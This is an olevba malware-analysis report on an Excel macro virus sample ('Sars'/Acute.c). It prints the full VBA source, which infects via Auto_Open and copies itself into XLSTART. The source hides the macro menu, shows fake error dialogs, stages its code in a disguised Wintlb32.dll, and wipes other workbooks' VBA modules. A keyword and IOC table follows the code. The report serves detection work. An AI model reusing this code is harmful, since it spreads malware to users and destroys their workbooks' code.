olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Acute.c.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Acute.c.xls 
in file: Virus.MSExcel.Acute.c.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'   Sars virus!
'   Bandung, Indonesian
'   Tonk sok Sars nyieunan macro, lah...
'
Public Const Micro = "Sars"
Public Const Data0 = Micro & ".xls"
Public Const Data1 = "The Visual Basic environment could not be intialize. Please run setup to install it correctly."
Sub CkAgain()
Attribute CkAgain.VB_ProcData.VB_Invoke_Func = " \n14"
Dim bg          As Object
Dim po          As Object

On Error Resume Next


End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim Ct                  As Object
    Dim bg                  As Object
    Dim bgc                 As Object
    Dim bck                 As Object
    Dim xlsz                As Object
    Dim Ck                  As Boolean
    
On Error Resume Next
KillStart
With Application
     If WeekDay(Now) Mod 2 = A Then
        .Caption = "~~Fakir Meng_"
     Else
        .Caption = "~~Fakir Meng_"
     End If
     If Dir(.Path & "\Xlstart") = "" Then MkDir .Path & "\Xlstart"
     If Day(Date) = 20 Then
        MsgBox "UPDATE ME NOW, INFECTED BY BUGGIE!", 48, Micro
        Date = Now + 1
     End If
     .ScreenUpdating = False
     .EnableCancelKey = xlDisabled
     If Day(Date) Mod 2 = 0 Then
        .OnTime Now + TimeValue("1"), "SarsWordArt"
     End If
     If Dir(.StartupPath & "\" & Data0) = "" Then
        ActiveWorkbook.SaveAs .StartupPath & "\" & Data0
     End If
     If Workbooks.Count = 1 And .Workbooks(1).Name = Data0 Then
        Workbooks.Add: ActiveWorkbook.Windows(1).Caption = "Book1"
     End If
        Set bg = ActiveWorkbook
        .OnKey "%{F12}", "Sars.Cr"
        .OnKey "%{F8}", "Sars.Cr"
        .OnKey "%{F11}", "Sars.Cr"
        .CommandBars("Window").Controls("Unhide...").Enabled = False
        .CommandBars("Tools").Controls("Macro").Delete
     .OnSheetActivate = "Sars.xls!auto_Open"
     Workbooks(Data0).Windows.Item(1).Visible = False
     
     CkAgain
     If Dir(.Path & "\Wintlb32.dll") = "" Then
               Workbooks(Data0).VBProject.VBComponents(Micro).Export .Path & "\Wintlb32.dll"
     End If
     
        For Each boom In bg.VBProject.VBComponents
             If boom.Type <> 100 Then
                If boom.Name <> Micro Then
                   bg.VBProject.VBComponents.Remove boom
                End If
             Else
                Set bck = boom.codemodule
                If bck.CountOflines <> 0 Then bck.Deletelines 1, bck.CountOflines
             End If
         Next boom
     
     For Each xlsz In bg.VBProject.VBComponents
         If xlsz.Name = Micro Then Ck = True: Exit For
     Next xlsz
     
     If Ck = False Then
        Set Ct = bg.VBProject.VBComponents
               Ct.Import .Path & "\Wintlb32.dll"
               Kill .Path & "\Wintlb32.dll"
               Workbooks(Data0).Save
               If InStr(1, bg.FullName, "\") Then ActiveWorkbook.Save
     End If
     
End With
End Sub
Sub Cr(): MsgBox Data1, 16, "Microsoft Visual Basic": End Sub
Sub SarsWordArt()
Attribute SarsWordArt.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
ActiveSheet.Shapes.AddTextEffect(msoTextEffect16, Micro, "Arial Black", _
        36#, msoFalse, msoFalse, 205.5, 118.5).Select
Range("A1").Select
End Sub
Sub KillStart()
Attribute KillStart.VB_ProcData.VB_Invoke_Func = " \n14"
 Dim oow        As Integer
 Dim waw        As Object
 Dim Myname     As String
 Dim MyPath     As String
 On Error Resume Next
MyPath = Application.StartupPath
Myname = Dir(MyPath, 1)
Do While Myname <> ""
    If Myname <> Data0 Then
       Set waw = Workbooks(Myname)
           waw.Close 0
               
               End If
    Myname = Dir()
Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Wintlb32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

